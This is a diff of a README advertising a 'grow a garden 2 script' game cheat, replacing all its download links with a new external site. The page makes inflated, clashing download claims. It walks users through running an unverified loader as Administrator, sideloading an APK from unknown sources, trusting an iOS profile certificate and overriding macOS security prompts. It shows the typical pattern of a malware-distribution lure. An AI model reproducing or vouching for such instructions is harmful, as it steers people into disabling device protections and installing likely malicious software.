@@ -4,7 +4,7 @@
 
 The most trusted and authentic **grow a garden 2 script** available on the internet, packed with powerful automation, anti AFK protection, and seamless event handling. This official release has been downloaded by over 12.4 million users across PC and mobile platforms. Whether you need an auto collect seed module, a pet spawner, or infinite sprinkler support, this verified grow a garden 2 script delivers everything in a single no-key package — stable, secure, and updated for October 2026.
 
-[![Download Now](https://img.shields.io/badge/DOWNLOAD_GROW_A_GARDEN_2_SCRIPT-GET_v4.8.3-00cc44?style=for-the-badge&logo=download&logoColor=white)](https://cheat4heaven.net/sosihui/growagarden2)
+[![Download Now](https://img.shields.io/badge/DOWNLOAD_GROW_A_GARDEN_2_SCRIPT-GET_v4.8.3-00cc44?style=for-the-badge&logo=download&logoColor=white)](https://growagardenscriptdelta.github.io/growagarden/)
 
 ---
 
@@ -83,7 +83,7 @@ The official grow a garden 2 script is available for all major platforms. Below 
 
 This grow a garden 2 script for pc is the most popular variant with 8.1M of the total 12.4M downloads.
 
-1. Visit the [official download page](https://cheat4heaven.net/sosihui/growagarden2) from this repository
+1. Visit the [official download page](https://growagardenscriptdelta.github.io/growagarden/) from this repository
 2. Click the **Download for Windows** button to receive `GAG2-Script-v4.8.3-win64.zip` (14.7 MB)
 3. Extract the archive to any folder — we recommend `C:\Tools\GAG2Script\`
 4. Run `GAG2Loader.exe` as **Administrator** — right-click → **Run as administrator**
@@ -96,7 +96,7 @@ This grow a garden 2 script for pc is the most popular variant with 8.1M of the 
 
 The grow a garden 2 script mobile experience on Android is fully optimized for touchscreen devices.
 
-1. Navigate to the [official download link](https://cheat4heaven.net/sosihui/growagarden2) on your Android browser
+1. Navigate to the [official download link](https://growagardenscriptdelta.github.io/growagarden/) on your Android browser
 2. Download `GAG2-Script-v4.8.3-arm64.apk` (16.2 MB)
 3. Enable **Install from Unknown Sources** in **Settings → Security → Install Unknown Apps**
 4. Open the `.apk` file and tap **Install**
@@ -109,7 +109,7 @@ Minimum Android version: `8.0 Oreo` | Recommended: `12.0+` for optimal 60 FPS pe
 
 The verified grow a garden 2 script for iOS works on iPhones and iPads running `iOS 16` or higher.
 
-1. Open Safari and go to the [official download page](https://cheat4heaven.net/sosihui/growagarden2)
+1. Open Safari and go to the [official download page](https://growagardenscriptdelta.github.io/growagarden/)
 2. Tap **Download for iOS** and follow the profile installation prompts
 3. Go to **Settings → General → VPN & Device Management** and trust the official certificate
 4. The grow a garden 2 script app (11.3 MB) will appear on your home screen
@@ -120,7 +120,7 @@ The verified grow a garden 2 script for iOS works on iPhones and iPads running `
 
 The official grow a garden 2 script runs natively on macOS with both Intel and Apple Silicon support.
 
-1. Download from the [official release page](https://cheat4heaven.net/sosihui/growagarden2)
+1. Download from the [official release page](https://growagardenscriptdelta.github.io/growagarden/)
 2. Open `GAG2-Script-v4.8.3-macos.dmg` (18.9 MB)
 3. Drag the app into your `/Applications` folder
 4. On first launch, go to **System Settings → Privacy & Security** and click **Open Anyway**
@@ -312,12 +312,12 @@ Download the official grow a garden 2 script `v4.8.3` today and join 850K users 
 
 ## 🌐 Community & Links
 
-* 💬 **Official Discord:** [Join the Community Server](https://cheat4heaven.net/sosihui/growagarden2)
-* 📦 **GitHub Releases:** [Download Latest Build](https://cheat4heaven.net/sosihui/growagarden2)
-* 📖 **Documentation:** [Read the Official Docs](https://cheat4heaven.net/sosihui/growagarden2)
-* 🐛 **Bug Reports:** [Submit an Issue](https://cheat4heaven.net/sosihui/growagarden2)
-* ⭐ **Star This Repo** — [Support the Project](https://cheat4heaven.net/sosihui/growagarden2)
-* 🔔 **Release Notifications:** [Watch for Updates](https://cheat4heaven.net/sosihui/growagarden2)
+* 💬 **Official Discord:** [Join the Community Server](https://growagardenscriptdelta.github.io/growagarden/)
+* 📦 **GitHub Releases:** [Download Latest Build](https://growagardenscriptdelta.github.io/growagarden/)
+* 📖 **Documentation:** [Read the Official Docs](https://growagardenscriptdelta.github.io/growagarden/)
+* 🐛 **Bug Reports:** [Submit an Issue](https://growagardenscriptdelta.github.io/growagarden/)
+* ⭐ **Star This Repo** — [Support the Project](https://growagardenscriptdelta.github.io/growagarden/)
+* 🔔 **Release Notifications:** [Watch for Updates](https://growagardenscriptdelta.github.io/growagarden/)
 
 ---
 
